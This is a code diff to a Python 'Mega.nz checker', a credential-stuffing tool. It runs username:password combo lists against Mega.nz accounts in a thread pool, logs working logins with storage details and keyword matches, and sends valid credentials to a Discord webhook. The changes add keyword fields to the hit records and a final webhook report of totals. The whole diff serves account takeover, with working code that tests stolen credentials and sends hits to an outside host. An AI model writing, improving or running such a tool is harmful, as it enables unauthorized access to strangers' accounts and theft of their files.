@@ -61,7 +61,7 @@ else:
     print("\nWebhook Attached. Hits will be sent to webhook aswell. You will get a test message right now.\n")
     webhook = DiscordWebhook(
         url=webhook_Custom,
-        content=f"Webhook Successfully attached | Mega.nz checker by https://github.com/arboff | Combo Lines: {size} | Export name: {name} | Waiting for start.")
+        content=f"Webhook Successfully attached | Mega.nz checker by https://github.com/arboff | Combo Lines: {size} | Export name: {filename} | Keyword: {search_string} | Waiting for start.")
     response = webhook.execute()
 
 print("\n=========================================================================================================================\n")
@@ -83,7 +83,7 @@ def check(username, password):
     global hits
     global customs
     global fails
-    tab_name = f"title Mega.nz Checker by Arboff // Checked: [{checked} / {size}] // Hit: [{hits}] // Custom: [{customs}] // Fail: [{fails}]"
+    tab_name = f"title Mega.nz Checker by Arboff // Checked: [{checked} / {size}] // Hit: [{hits}] // Custom: [{customs}] // Fail: [{fails} // Keyword: [ {search_string} ] // Export Name: [ {filename} ]"
     mega = Mega()
     os.system(tab_name)
     try:
@@ -98,11 +98,8 @@ def check(username, password):
             found = True
         else:
             found = False
-
-        hit_str = (f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()} | Keyword Match: {str(found).upper()} | String Position in Array: {checked} / {size}")
-        print(f"{hit()} {username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Keyword Match: {str(found).upper()}")
-
-
+        hit_str = (f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()} | Keyword Match: {str(found).upper()} | Keyword: {search_string} | String Position in Array: [ {checked + 1} / {size} ]")
+        print(f"{hit()} {username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Keyword: {search_string} | Keyword Match: {str(found).upper()} | String Position: [ {checked + 1} / {size} ]")
         hits += 1
         try:
             webhook = DiscordWebhook(
@@ -113,8 +110,7 @@ def check(username, password):
             print(f"{error()} Webhook Error / Not Added.")
 
         with open(filename, "a") as e:
-            e.writelines(f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB\n")
-            hits += 1
+            e.writelines(f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()} | Keyword Match: {str(found).upper()} | Keyword: {search_string} | String Position in Array: [ {checked + 1} / {size} ]\n")
             e.close()
 
     except Exception as e:
@@ -145,4 +141,9 @@ pool.close()
 pool.join()
 
 
-input(f"\n\n\nChecker finished. Hits exported to {filename}. Press enter to exit.")
+webhook = DiscordWebhook(
+        url=webhook_Custom,
+        content=f"Checker Finished | Total Checked: {checked} | Combo Lines: {size} | Export name: {name} | Hits: {hits} | Custom: {customs} | Fails: {fails} | Keyword: [ {search_string} ]" )
+response = webhook.execute()
+
+input(f"\n\n\nChecker finished. Hits exported to {filename}. Webhook sent with results. Press enter to exit.")
